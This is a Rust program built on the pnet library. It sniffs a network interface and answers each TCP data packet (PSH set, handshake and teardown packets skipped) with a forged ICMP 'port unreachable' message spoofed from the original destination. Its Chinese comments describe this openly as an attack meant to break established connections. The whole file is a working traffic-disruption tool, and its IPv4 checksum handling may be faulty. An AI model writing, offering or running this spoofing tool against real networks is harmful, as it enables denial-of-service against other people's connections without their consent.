use pnet::datalink::{self, NetworkInterface, DataLinkSender, DataLinkReceiver};
use pnet::datalink::Channel::Ethernet;
use pnet::packet::{Packet};
use pnet::packet::ethernet::{EthernetPacket, MutableEthernetPacket, EtherTypes};
use pnet::packet::ipv4::{Ipv4Packet, MutableIpv4Packet};
use pnet::packet::tcp::TcpPacket;
use pnet::packet::icmp::{IcmpType, IcmpCode};
use pnet::packet::icmp::destination_unreachable::MutableDestinationUnreachablePacket;
use pnet::util;
use std::env;
use std::net::Ipv4Addr;

fn main() {
    let interface_name = env::args().nth(1).unwrap_or_else(|| "eth0".to_string());

    let interface = find_interface(&interface_name);
    println!("监听网卡: {}", interface_name);
    println!("MAC 地址: {:?}\n", interface.mac);

    let (mut tx, mut rx) = create_channel(&interface);
    start_capture(&mut tx, &mut rx);
}

fn find_interface(name: &str) -> NetworkInterface {
    let interfaces = datalink::interfaces();
    interfaces.into_iter()
        .find(|iface| iface.name == name)
        .expect(&format!("网卡 {} 不存在", name))
}

fn create_channel(interface: &NetworkInterface) -> (Box<dyn DataLinkSender>, Box<dyn DataLinkReceiver>) {
    match datalink::channel(interface, Default::default()) {
        Ok(Ethernet(tx, rx)) => (tx, rx),
        Ok(_) => panic!("不支持的通道类型"),
        Err(e) => panic!("创建通道失败: {}", e),
    }
}

fn start_capture(tx: &mut Box<dyn DataLinkSender>, rx: &mut Box<dyn DataLinkReceiver>) {
    loop {
        match rx.next() {
            Ok(packet) => {
                process_packet(tx, packet);
            }
            Err(e) => eprintln!("读取错误: {}", e),
        }
    }
}

fn process_packet(tx: &mut Box<dyn DataLinkSender>, packet: &[u8]) {
    let eth_packet = EthernetPacket::new(packet).unwrap();

    if eth_packet.get_ethertype() != EtherTypes::Ipv4 {
        return;
    }

    let ip_packet = match Ipv4Packet::new(eth_packet.payload()) {
        Some(p) => p,
        None => return,
    };

    if ip_packet.get_next_level_protocol() != pnet::packet::ip::IpNextHeaderProtocols::Tcp {
        return;
    }

    let src_mac = eth_packet.get_source();
    let dst_mac = eth_packet.get_destination();
    let src_ip = ip_packet.get_source();
    let dst_ip = ip_packet.get_destination();

    let tcp_packet = match TcpPacket::new(ip_packet.payload()) {
        Some(p) => p,
        None => return,
    };

    // 过滤：只攻击已建立连接的数据包，忽略握手包
    let flags = tcp_packet.get_flags();
    let is_syn = (flags & 0x02) != 0;  // SYN 标志
    let is_fin = (flags & 0x01) != 0;  // FIN 标志
    let is_rst = (flags & 0x04) != 0;  // RST 标志
    let is_psh = (flags & 0x08) != 0;  // PSH 标志（有数据）
    
    // 如果是握手包或结束包，不攻击
    if is_syn || is_fin || is_rst {
        return;
    }
    
    // 只攻击带数据的包（PSH 标志），让纯 ACK 包通过
    // 这样不会干扰握手的最后一个 ACK
    if !is_psh {
        return;
    }
    
    // 只攻击数据传输阶段的包（PSH+ACK）
    println!("🎯 检测到数据包: {}:{} -> {}:{}", 
        src_ip, tcp_packet.get_source(), 
        dst_ip, tcp_packet.get_destination());
    
    send_icmp_unreachable(tx, src_ip, dst_ip, dst_mac, src_mac, &ip_packet, &tcp_packet);
}

// ICMP Type 3: Destination Unreachable
// ICMP Code 3: Port Unreachable
fn send_icmp_unreachable(
    tx: &mut Box<dyn DataLinkSender>,
    original_src_ip: Ipv4Addr,
    original_dst_ip: Ipv4Addr,
    src_mac: pnet::util::MacAddr,
    dst_mac: pnet::util::MacAddr,
    ip_packet: &Ipv4Packet,
    tcp_packet: &TcpPacket,
) {
    // 1. 准备 ICMP payload：原始 IP 头 + TCP 头前 8 字节
    let ip_header_len = ip_packet.get_header_length() as usize * 4;
    let mut icmp_payload = Vec::new();
    icmp_payload.extend_from_slice(&ip_packet.packet()[..ip_header_len]);
    icmp_payload.extend_from_slice(&tcp_packet.packet()[..8.min(tcp_packet.packet().len())]);

    // 2. 创建 ICMP 不可达包
    let icmp_header_size = 8;
    let mut icmp_buf = vec![0u8; icmp_header_size + icmp_payload.len()];
    let mut icmp_packet = MutableDestinationUnreachablePacket::new(&mut icmp_buf).unwrap();
    icmp_packet.set_icmp_type(IcmpType(3));
    icmp_packet.set_icmp_code(IcmpCode(3));
    icmp_packet.set_payload(&icmp_payload);
    icmp_packet.set_checksum(0);
    icmp_packet.set_checksum(util::checksum(icmp_packet.packet(), 1));

    // 3. 创建 IPv4 包
    let mut ipv4_buf = vec![0u8; 20 + icmp_packet.packet().len()];
    let mut ipv4_packet = MutableIpv4Packet::new(&mut ipv4_buf).unwrap();
    ipv4_packet.set_version(4);
    ipv4_packet.set_header_length(5);
    ipv4_packet.set_total_length((20 + icmp_packet.packet().len()) as u16);
    ipv4_packet.set_ttl(64);
    ipv4_packet.set_next_level_protocol(pnet::packet::ip::IpNextHeaderProtocols::Icmp);
    ipv4_packet.set_source(original_dst_ip);
    ipv4_packet.set_destination(original_src_ip);
    
    // 修复：手动复制 ICMP 数据到 IPv4 的 payload 区域
    ipv4_buf[20..20 + icmp_packet.packet().len()].copy_from_slice(icmp_packet.packet());
    
    // 重新创建 packet 以确保数据正确
    let mut ipv4_packet = MutableIpv4Packet::new(&mut ipv4_buf).unwrap();
    let checksum = util::checksum(ipv4_packet.packet(), 5);
    ipv4_packet.set_checksum(checksum);

    // 4. 创建以太网帧
    let mut eth_buf = vec![0u8; 14 + ipv4_buf.len()];
    let mut eth_packet = MutableEthernetPacket::new(&mut eth_buf).unwrap();
    eth_packet.set_ethertype(EtherTypes::Ipv4);
    eth_packet.set_source(src_mac);
    eth_packet.set_destination(dst_mac);
    
    // 修复：手动复制 IPv4 数据到以太网帧的 payload 区域
    eth_buf[14..14 + ipv4_buf.len()].copy_from_slice(&ipv4_buf);

    // 5. 发送
    match tx.send_to(&eth_buf, None) {
        Some(Ok(_)) => println!("✓ 发送 ICMP 端口不可达: {}:{} -> {}:{}", 
            original_src_ip, tcp_packet.get_source(),
            original_dst_ip, tcp_packet.get_destination()),
        Some(Err(e)) => eprintln!("✗ 发送失败: {:?}", e),
        None => eprintln!("✗ 发送失败: 无数据"),
    }
}
